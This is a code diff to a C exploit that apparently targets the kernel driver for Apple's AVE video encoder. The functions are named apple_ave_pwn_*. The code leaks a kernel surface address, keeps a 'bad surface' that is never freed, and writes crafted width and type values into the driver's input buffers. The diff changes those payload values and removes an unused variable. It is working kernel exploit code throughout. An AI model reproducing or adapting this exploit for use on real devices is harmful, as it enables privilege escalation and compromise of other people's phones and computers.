@@ -10,7 +10,6 @@ static io_connect_t g_apple_ave_conn = 0;
 static void * g_bad_surface_that_will_never_be_freed_kernel_ptr = NULL;
 static uint32_t g_bad_surface_that_will_never_be_freed = 0;
 static void * g_bad_surface_buffer = NULL;
-static size_t g_bad_surface_buffer_size = 0;
 
 /*
  * Function name: 	apple_ave_pwn_get_bad_surface_kernel_ptr
@@ -116,10 +115,16 @@ kern_return_t apple_ave_pwn_get_surface_kernel_address(uint32_t surface_id, void
 	*(unsigned int*)(input_buffer + 0xD8) = g_bad_surface_that_will_never_be_freed;
 	*(unsigned int*)(input_buffer + 0xE8) = g_bad_surface_that_will_never_be_freed;
 	*(unsigned int*)(input_buffer + 0xEC) = g_bad_surface_that_will_never_be_freed;
+    *(unsigned int*)(input_buffer + 0x14) = 0x10007ef; // uiWidth (0xfffe)
+//    *(unsigned int*)(input_buffer + 0x3F) = 0xfffe; // uiFrameHeight
 	input_buffer[0xFC] = 1;
 	input_buffer[0x2F4] = 1;
+    input_buffer[0x14] = 0x10007ef; // uiWidth
+    
+    // 0x40 for the uiWidth
+//    input_buffer[0x3F] = 1; // uiHeight
 
-	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_info_type)) = 0x4567;
+	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_info_type)) = 0xffff;
 
 	*((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_chroma_format_idc)) = 1;
 	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_ui32_width)) = 0xC0;
@@ -236,10 +241,8 @@ kern_return_t apple_ave_pwn_init() {
 	}
 
 	g_bad_surface_buffer = *(void**)surface_data;
-	g_bad_surface_buffer_size = *(uint32_t*)(surface_data+0x14);
 
-	ret = apple_ave_pwn_get_surface_kernel_address(g_bad_surface_that_will_never_be_freed, 
-		&g_bad_surface_that_will_never_be_freed_kernel_ptr);
+	ret = apple_ave_pwn_get_surface_kernel_address(g_bad_surface_that_will_never_be_freed, &g_bad_surface_that_will_never_be_freed_kernel_ptr);
 
 	if (KERN_SUCCESS != ret)
 	{
